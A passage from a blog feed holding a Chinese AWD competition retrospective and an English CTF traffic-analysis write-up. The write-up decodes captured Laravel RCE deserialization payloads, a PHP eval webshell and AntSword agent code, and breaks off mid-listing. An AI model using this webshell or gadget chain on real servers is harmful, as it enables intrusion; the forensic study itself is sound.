    <category term="红队技能" scheme="https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>绿城杯AWD总结</title>
    <link href="https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-14T17:07:20.000Z</published>
    <updated>2021-10-14T17:13:11.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF/AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY上午不禁止去厕所，下午AWD却禁止去厕所，谁AWD还有空去PY？消息通知混乱，到了郑州才知道要做核酸，获奖队伍少，奖金少，无现金，只有E卡。我愿称之为全国最穷国家网络安全宣传周活动。<br>下面说我在比赛中返的一些错误。上午CTF，本人菜，没啥好说的。</p><h1 id="致命"><a href="#致命" class="headerlink" title="致命"></a>致命</h1><p>AWD流程环节出现严重问题。赛前演练四个人的配合中都没有演练到文件监控脚本的使用，导致被别人种了不死马掉大分。在监控不到流量、pwn题下线、web一直被打的情况下当时没有想到不死马这个事情，是我疏忽了。上了文件监控脚本后再也没失分。（自动删除不死马及任何新上传的文件，无crontab，这里需要注意的是，<strong>比赛的时候我忘记crontab路径了，只能看当前user，但shell的权限大部分是www-data需要加强记忆</strong>）</p><h1 id="严重"><a href="#严重" class="headerlink" title="严重"></a>严重</h1><p>脚本编写能力过差。当队友通过流量抓取到漏洞利用方式时，经我验证后应该迅速写出批量利用脚本，在这个地方卡住了，导致写脚本写的比较慢，应该是丢掉了许多分数。</p><p>无法自动提交flag。安恒的HTTPS流量不知道为啥抓不到，没有办法用脚本自动提交flag。</p><p>无法进一步利用已知漏洞种植不死马。这导致丢了很多分数</p><p>赛时脚本结构混乱，应将功能点分开，RCE利用和种马应同时尝试进行，利用马getflag的操作应该在另一个文件中。多线程尚未熟练掌握</p><p>AOIAWD赛前未成功部署，仅靠watchbird总是感觉力不从心。</p><h1 id="轻微"><a href="#轻微" class="headerlink" title="轻微"></a>轻微</h1><p>赛时紧张，对待队友的态度有时过激。</p><h1 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h1><p>1.提高脚本编写能力，掌握多线程，优化脚本结构</p><p>2.在AWD演练中尝试使用RCE漏洞种植不死马并getflag。</p><p>3.本地部署AOIAWD</p><p>4.crontab路径熟记，防止有人写crontab。</p><p>5.模拟时严格演练流程，优化分工。</p><p>6.应正确对待队友，克制自己的情绪。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次我有点拉跨，不过队友的表现很好，能各司其职的负责我所分配的认为（流量、赛题监控、备份与恢复、杀毒、流量告警等）我认为我的队友第一次打线下AWD能做到这种程度比我强太多了。下次AWD一定拿下！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Traffic analysis in Lvcheng Cup</title>
    <link href="https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/"/>
    <id>https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/</id>
    <published>2021-10-09T02:59:51.000Z</published>
    <updated>2021-10-09T07:43:36.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Target: <strong>FIND THE FLAG(hint : AntSwort traffic)</strong></p><p>Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis.</p><h1 id="AntSword-and-Laravel-RCE-Traffic-Analysis"><a href="#AntSword-and-Laravel-RCE-Traffic-Analysis" class="headerlink" title="AntSword  and Laravel RCE Traffic  Analysis"></a>AntSword  and Laravel RCE Traffic  Analysis</h1><p>There are many packets in the pcap file,personally I’’ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. </p><p><img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image"><br>Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command.</p><p><img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image"></p><h2 id="node1"><a href="#node1" class="headerlink" title="node1"></a>node1</h2><p>Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I haven’t find secret.zip,so keep following  packets.<br><img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image"></p><h2 id="node1-end"><a href="#node1-end" class="headerlink" title="node1 end"></a>node1 end</h2><p>In a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character.</p><p><img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image"></p><p>Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didn’t find any passwords,after fix ,check and broute tools I still can’t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,it’s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked.</p><p>In <strong>node 1</strong> we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>Replacing =00 to null then base64 decode it, we can get the webshell contents.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><?php @eval(@gzinflate(base64_decode($_POST[14433])));?><p> are webshell.We can decode traffic after base64 and gzip decode.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span 